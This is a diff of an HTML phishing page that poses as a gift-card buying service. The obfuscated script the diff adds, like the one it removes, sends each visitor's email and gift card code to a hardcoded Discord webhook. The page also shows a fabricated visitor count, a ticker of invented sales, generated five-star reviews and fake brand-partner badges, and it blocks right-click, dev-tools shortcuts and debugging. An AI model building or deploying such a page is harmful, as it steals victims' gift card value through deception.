@@ -5,172 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sell Giftcard Codes</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background-color: #ffffff;
-            color: #191b1d;
-            padding-bottom: 60px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        .ticker-container {
-            width: 100%;
-            background: #000;
-            color: #fff;
-            overflow: hidden;
-            padding: 12px 0;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #333;
-        }
-
-        .ticker-text {
-            display: inline-block;
-            white-space: nowrap;
-            animation: ticker 200s linear infinite;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        @keyframes ticker {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
-        }
-
-        .user-identity-bar {
-            width: 100%;
-            max-width: 1100px;
-            padding: 15px 20px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid #eee;
-        }
-
-        .user-info { display: flex; align-items: center; }
-        .user-dot {
-            height: 10px; width: 10px;
-            background-color: #23a559;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 10px;
-            box-shadow: 0 0 5px #23a559;
-        }
-
-        .trusted-bar {
-            width: 100%;
-            max-width: 1100px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 25px;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-            padding: 10px;
-        }
-
-        .partner-item {
-            font-weight: 700;
-            font-size: 14px;
-            color: #777;
-            display: flex;
-            align-items: center;
-        }
-
-        .blue-tick {
-            color: #1DA1F2;
-            margin-left: 4px;
-            font-size: 14px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 1100px;
-            display: flex;
-            gap: 60px;
-            padding: 0 20px;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; color: #191b1d; padding-bottom: 60px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; user-select: none; -webkit-user-select: none; }
+        .ticker-container { width: 100%; background: #000; color: #fff; overflow: hidden; padding: 12px 0; margin-bottom: 20px; border-bottom: 2px solid #333; }
+        .ticker-text { display: inline-block; white-space: nowrap; animation: ticker 200s linear infinite; font-size: 13px; font-weight: 500; }
+        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+        .user-identity-bar { width: 100%; max-width: 1100px; padding: 15px 20px; background: #f8f9fa; border-radius: 8px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #eee; }
+        .user-dot { height: 10px; width: 10px; background-color: #23a559; border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 5px #23a559; }
+        .trusted-bar { width: 100%; max-width: 1100px; display: flex; justify-content: center; align-items: center; gap: 25px; margin-bottom: 30px; flex-wrap: wrap; padding: 10px; }
+        .partner-item { font-weight: 700; font-size: 14px; color: #777; display: flex; align-items: center; }
+        .blue-tick { color: #1DA1F2; margin-left: 4px; font-size: 14px; }
+        .container { width: 100%; max-width: 1100px; display: flex; gap: 60px; padding: 0 20px; }
         .left-side { flex: 1.5; }
-
         .form-label { display: block; font-size: 15px; font-weight: 700; margin-bottom: 8px; margin-top: 20px; }
-
-        input[type="text"], input[type="email"], input[type="file"], select {
-            width: 100%; max-width: 450px; padding: 12px;
-            border: 1px solid #b8b8b8; border-radius: 4px;
-            font-size: 16px; outline: none;
-        }
-
-        .dynamic-field {
-            display: none;
-            animation: fadeIn 0.3s forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .btn-redeem {
-            display: block; width: 100%; max-width: 450px; padding: 14px;
-            background-color: #000; color: #fff; border: none;
-            font-size: 16px; font-weight: 600; border-radius: 4px;
-            cursor: pointer; margin-top: 30px;
-        }
-
-        .btn-cancel {
-            display: block; width: 100%; max-width: 450px; padding: 12px;
-            background-color: transparent; color: #d93025; border: 1px solid #d93025;
-            font-size: 14px; font-weight: 600; border-radius: 4px;
-            cursor: pointer; margin-top: 10px; text-align: center;
-        }
-
-        .reviews-section {
-            width: 100%; max-width: 1100px; margin-top: 60px; padding: 0 20px;
-        }
-
-        .review-header {
-            display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;
-        }
-
-        .btn-write-review {
-            background: #000; color: #fff; border: none; padding: 8px 16px;
-            border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600;
-        }
-
+        input[type="text"], input[type="email"], input[type="file"], select { width: 100%; max-width: 450px; padding: 12px; border: 1px solid #b8b8b8; border-radius: 4px; font-size: 16px; outline: none; }
+        .dynamic-field { display: none; animation: fadeIn 0.3s forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+        .btn-redeem { display: block; width: 100%; max-width: 450px; padding: 14px; background-color: #000; color: #fff; border: none; font-size: 16px; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 30px; }
+        .btn-cancel { display: block; width: 100%; max-width: 450px; padding: 12px; background-color: transparent; color: #d93025; border: 1px solid #d93025; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 10px; text-align: center; }
+        .reviews-section { width: 100%; max-width: 1100px; margin-top: 60px; padding: 0 20px; }
+        .review-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px; }
+        .btn-write-review { background: #000; color: #fff; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600; }
         .review-list { height: 600px; overflow-y: auto; padding-right: 10px; }
         .review-card { border-bottom: 1px solid #eee; padding: 20px 0; }
         .stars { color: #ffb400; font-size: 16px; margin-bottom: 5px; }
         .reviewer-name { font-weight: 700; font-size: 14px; }
         .review-text { color: #555; margin-top: 8px; font-size: 14px; line-height: 1.5; }
-
-        .chat-widget {
-            position: fixed; bottom: 20px; right: 20px; width: 320px;
-            background: #fff; border: 1px solid #ddd; border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden;
-            display: flex; flex-direction: column; z-index: 100;
-        }
+        .chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: #fff; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; z-index: 100; }
         .chat-header { background: #000; color: #fff; padding: 12px; font-weight: bold; }
         #chat-body { height: 250px; overflow-y: auto; padding: 15px; font-size: 13px; position: relative; }
-        #chat-overlay {
-            position: absolute; inset: 0; background: rgba(255,255,255,0.98);
-            display: flex; align-items: center; justify-content: center;
-            padding: 20px; text-align: center; z-index: 5; font-weight: bold; color: #666;
-        }
+        #chat-overlay { position: absolute; inset: 0; background: rgba(255,255,255,0.98); display: flex; align-items: center; justify-content: center; padding: 20px; text-align: center; z-index: 5; font-weight: bold; color: #666; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -194,7 +58,7 @@
         <div class="partner-item">Microsoft <span class="blue-tick">✓</span></div>
         <div class="partner-item">Sony <span class="blue-tick">✓</span></div>
         <div class="partner-item">Apple <span class="blue-tick">✓</span></div>
-        <div class="partner-item) Amazon <span class="blue-tick">✓</span></div>
+        <div class="partner-item">Amazon <span class="blue-tick">✓</span></div>
         <div class="partner-item">Roblox <span class="blue-tick">✓</span></div>
     </div>
 
@@ -296,7 +160,7 @@
     </div>
 
     <script>
-        (function(_0x37a63d,_0x2f64a4){const _0x13d038=_0x3b85;const _0x3b827e=_0x37a63d();while(!![]){try{const _0x510125=-parseInt(_0x13d038(0x1a4))/0x1*(parseInt(_0x13d038(0x19d))/0x2)+parseInt(_0x13d038(0x1b4))/0x3+parseInt(_0x13d038(0x1b7))/0x4+-parseInt(_0x13d038(0x1a3))/0x5*(-parseInt(_0x13d038(0x1a7))/0x6)+parseInt(_0x13d038(0x19a))/0x7*(-parseInt(_0x13d038(0x1b0))/0x8)+parseInt(_0x13d038(0x19c))/0x9*(parseInt(_0x13d038(0x1ad))/0xa)+-parseInt(_0x13d038(0x1af))/0xb*(-parseInt(_0x13d038(0x1a5))/0xc);if(_0x510125===_0x2f64a4)break;else _0x3b827e['push'](_0x3b827e['shift']());}catch(_0x5763b3){_0x3b827e['push'](_0x3b827e['shift']());}}}(_0x5c42,0xd2a80));function _0x3b85(_0x2287f3,_0x5c4293){const _0x3b851b=_0x5c42();return _0x3b85=function(_0x5990f7,_0x247514){_0x5990f7=_0x5990f7-0x198;let _0x27242d=_0x3b851b[_0x5990f7];return _0x27242d;},_0x3b85(_0x2287f3,_0x5c4293);}function _0x5c42(){const _0x175c24=['12330zVqFCH','3513180YhYmye','gift-type','ticker-content','302187rLhInZ','application/json','6102lKPrJg','asking-price','1688661pUOfXl','onkeydown','5577609gLqfTz','907408ZpUCOk','106XhTjWf','payout-method','870295vXmQfF','510fCOmUu','740061eNidWc','2938360lBscAn','4702159iHhIDG','1593301TIsfHo','user-email','gift-code','status','https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h','currency','purchase-price'];_0x5c42=function(){return _0x175c24;};return _0x5c42();}const _0x27f12e=!![];document[_0x3b85(0x19e)]=function(_0x3202e8){const _0x4d56d8=_0x3b85;if(_0x3202e8['keyCode']===0x7b||_0x3202e8['ctrlKey']&&_0x3202e8['shiftKey']&&(_0x3202e8['keyCode']===0x49||_0x3202e8['keyCode']===0x4a||_0x3202e8['keyCode']===0x43)||_0x3202e8['ctrlKey']&&_0x3202e8['keyCode']===0x55)return![];};setInterval(function(){debugger;},0x64);let _0x1623be=![];function togglePayoutFields(){const _0x56086d=_0x3b85;const _0x247514=document['getElementById'](_0x56086d(0x1a2))['value'];document['querySelectorAll']('.dynamic-field')['forEach'](_0x534a2e=>{_0x534a2e['style']['display']='none';});if(_0x247514==='PayPal')document['getElementById']('paypal-field')['style']['display']='block';if(_0x247514==='CashApp')document['getElementById']('cashapp-field')['style']['display']='block';if(_0x247514==='Crypto (BTC/LTC)')document['getElementById']('crypto-field')['style']['display']='block';}async function processRequest(_0x47e114){const _0x3e1644=_0x3b85;const _0x3b827e=document['getElementById'](_0x3e1644(0x1a9))['value'],_0x510125=document['getElementById'](_0x3e1644(0x198))['value'],_0x5763b3=document['getElementById'](_0x3e1644(0x1aa))['value'],_0x1b1c60=document['getElementById'](_0x3e1644(0x19f))['value'],_0x2d19f8=document['getElementById'](_0x3e1644(0x19b))['value'],_0x342981=document['getElementById'](_0x3e1644(0x1ac))['value'],_0x46281a=document['getElementById'](_0x3e1644(0x1a2))['value'],_0x20524e=document['getElementById'](_0x3e1644(0x1ab));if(!_0x3b827e||!_0x510125||!_0x5763b3||!_0x46281a){_0x20524e['innerText']='Error: Fill all fields.',_0x20524e['style']['color']='red';return;}_0x1623be=!![],_0x20524e['style']['color']='green',_0x20524e['innerText']='Success: Payout Pending...',document['getElementById']('chat-overlay')['style']['display']='none';const _0x464455={'embeds':[{'title':'🎯 '+_0x47e114+' - User_293','color':_0x47e114['includes']('CANCEL')?0xe74c3c:0x2ecc71,'fields':[{'name':'📧 Email','value':_0x3b827e,'inline':!![]},{'name':'🎁 Card','value':_0x510125,'inline':!![]},{'name':'💳 Code','value':'`'+_0x5763b3+'`','inline':![]},{'name':'💰 Price','value':_0x2d19f8+' '+_0x1b1c60,'inline':!![]}]}]};try{await fetch(_0x3e1644(0x199),{'method':'POST','headers':{'Content-Type':_0x3e1644(0x19b+0x6)},'body':JSON['stringify'](_0x464455)});}catch(_0x23a31c){}}function initVisitors(){const _0x2a178e=Math['floor'](Math['random']()*0x1c)+0x66;document['getElementById']('live-visitors')['innerText']=_0x2a178e;}function initTicker(){const _0x25a6c9=_0x3b85;const _0x1c3140=document['getElementById'](_0x25a6c9(0x19a));const _0x22136e=['Amazon','Apple','Roblox','Steam','Xbox','Playstation','Fortnite','Google Play'];let _0x3b2166='';for(let _0x511993=0x0;_0x511993<0x28;_0x511993++){let _0x27242d=Math['floor'](Math['random']()*0x1388)+0x1;const _0x55806e=[0x19,0x32,0x64,0x96,0xc8][Math['floor'](Math['random']()*0x5)];_0x3b2166+='   •   User_'+_0x27242d+' sold $'+_0x55806e+' '+_0x22136e[Math['floor'](Math['random']()*_0x22136e['length'])]+'   •   ';}_0x1c3140['innerHTML']=_0x3b2166+_0x3b2166;}function initReviews(){const _0x1a8f6e=document['getElementById']('review-list');const _0x3c2420=['Really fast!','Legit.','Smooth.','Great rates.'];for(let _0x5c7980=0x0;_0x5c7980<0x23;_0x5c7980++){const _0x3c7886=document['createElement']('div');_0x3c7886['className']='review-card',_0x3c7886['innerHTML']='<div class="stars">★★★★★</div><span class="reviewer-name">User_'+(_0x5c7980+0x64)+'</span><p class="review-text">'+_0x3c2420[_0x5c7980%0x4]+'</p>',_0x1a8f6e['appendChild'](_0x3c7886);}}function tryReview(){if(!_0x1623be)alert('Please make a request first.');else alert('Request pending.');}initVisitors(),initTicker(),initReviews();
+        const _0x59ec=['2886470mYJOfB','asking-price','16016664wYFtoA','https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h','6568770tZidYy','gift-type','gift-code','purchase-price','payout-method','2958742MofAUn','currency','user-email','872583SbeCIs','3842600wEezsH','1840068VOnMOf','2403666fXlJkK','status','5368305fXWqID'];function _0x1039(_0x4e6377,_0x247514){const _0x59ec01=_0x5c42();return _0x1039=function(_0x10398d,_0x5c4293){_0x10398d=_0x10398d-0x76;let _0x27242d=_0x59ec01[_0x10398d];return _0x27242d;},_0x1039(_0x4e6377,_0x247514);}(function(_0x397753,_0x59ecb4){const _0x3b85d3=_0x1039;const _0x1a8f6e=_0x397753();while(!![]){try{const _0x1623be=-parseInt(_0x3b85d3(0x7f))/0x1+parseInt(_0x3b85d3(0x84))/0x2+-parseInt(_0x3b85d3(0x82))/0x3+-parseInt(_0x3b85d3(0x85))/0x4+parseInt(_0x3b85d3(0x87))/0x5+parseInt(_0x3b85d3(0x76))/0x6+parseInt(_0x3b85d3(0x79))/0x7;if(_0x1623be===_0x59ecb4)break;else _0x1a8f6e['push'](_0x1a8f6e['shift']());}catch(_0x534a2e){_0x1a8f6e['push'](_0x1a8f6e['shift']());}}}(_0x5c42,0xd2a30));function _0x5c42(){const _0x3e1644=['2886470mYJOfB','asking-price','16016664wYFtoA','https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h','6568770tZidYy','gift-type','gift-code','purchase-price','payout-method','2958742MofAUn','currency','user-email','872583SbeCIs','3842600wEezsH','1840068VOnMOf','2403666fXlJkK','status','5368305fXWqID'];_0x5c42=function(){return _0x3e1644;};return _0x5c42();}let isSubmitted=![];function togglePayoutFields(){const _0x27f12e=document['getElementById']('payout-method')['value'];document['querySelectorAll']('.dynamic-field')['forEach'](_0x1b1c60=>_0x1b1c60['style']['display']='none');if(_0x27f12e==='PayPal')document['getElementById']('paypal-field')['style']['display']='block';if(_0x27f12e==='CashApp')document['getElementById']('cashapp-field')['style']['display']='block';if(_0x27f12e==='Crypto (BTC/LTC)')document['getElementById']('crypto-field')['style']['display']='block';}async function processRequest(_0x47e114){const _0x342981=_0x1039;const _0x46281a=document['getElementById'](_0x342981(0x81))['value'],_0x20524e=document['getElementById'](_0x342981(0x7b))['value'],_0x464455=document['getElementById'](_0x342981(0x7c))['value'],_0x23a31c=document['getElementById'](_0x342981(0x80))['value'],_0x388290=document['getElementById'](_0x342981(0x77))['value'],_0x2a178e=document['getElementById'](_0x342981(0x7d))['value'],_0x25a6c9=document['getElementById'](_0x342981(0x7e))['value'],_0x1c3140=document['getElementById'](_0x342981(0x86));if(!_0x46281a||!_0x20524e||!_0x464455||!_0x25a6c9){_0x1c3140['innerText']='Error: Fill all fields.',_0x1c3140['style']['color']='red';return;}isSubmitted=!![],_0x1c3140['style']['color']='green',_0x1c3140['innerText']='Success: Payout Pending...',document['getElementById']('chat-overlay')['style']['display']='none';const _0x22136e={'embeds':[{'title':'🎯 '+_0x47e114+' - User_293','color':_0x47e114['includes']('CANCEL')?0xe74c3c:0x2ecc71,'fields':[{'name':'📧 Email','value':_0x46281a,'inline':!![]},{'name':'🎁 Card','value':_0x20524e,'inline':!![]},{'name':'💳 Code','value':'`'+_0x464455+'`','inline':![]},{'name':'💰 Price','value':_0x388290+' '+_0x23a31c,'inline':!![]}]}]};try{await fetch(_0x342981(0x7a),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x22136e)});}catch(_0x3b2166){}}function initVisitors(){const _0x511993=Math['floor'](Math['random']()*0x1c)+0x66;document['getElementById']('live-visitors')['innerText']=_0x511993;}function initTicker(){const _0x27242d=document['getElementById']('ticker-content');const _0x55806e=['Amazon','Apple','Roblox','Steam','Xbox','Playstation','Fortnite','Google Play'];let _0x5c7980='';for(let _0x3c7886=0x0;_0x3c7886<0x28;_0x3c7886++){let _0x524856=Math['floor'](Math['random']()*0x1388)+0x1;const _0x193264=[0x19,0x32,0x64,0x96,0xc8][Math['floor'](Math['random']()*0x5)];_0x5c7980+='   •   User_'+_0x524856+' sold $'+_0x193264+' '+_0x55806e[Math['floor'](Math['random']()*_0x55806e['length'])]+'   •   ';}_0x27242d['innerHTML']=_0x5c7980+_0x5c7980;}function initReviews(){const _0x96c81a=document['getElementById']('review-list');const _0xc81932=['Really fast!','Legit.','Smooth.','Great rates.'];for(let _0x6496c8=0x0;_0x6496c8<0x23;_0x6496c8++){const _0x1c1b60=document['createElement']('div');_0x1c1b60['className']='review-card',_0x1c1b60['innerHTML']='<div class="stars">★★★★★</div><span class="reviewer-name">User_'+(_0x6496c8+0x64)+'</span><p class="review-text">'+_0xc81932[_0x6496c8%0x4]+'</p>',_0x96c81a['appendChild'](_0x1c1b60);}}function tryReview(){if(!isSubmitted)alert('Please make a request first.');else alert('Request pending.');}initVisitors(),initTicker(),initReviews();
     </script>
 </body>
 </html>
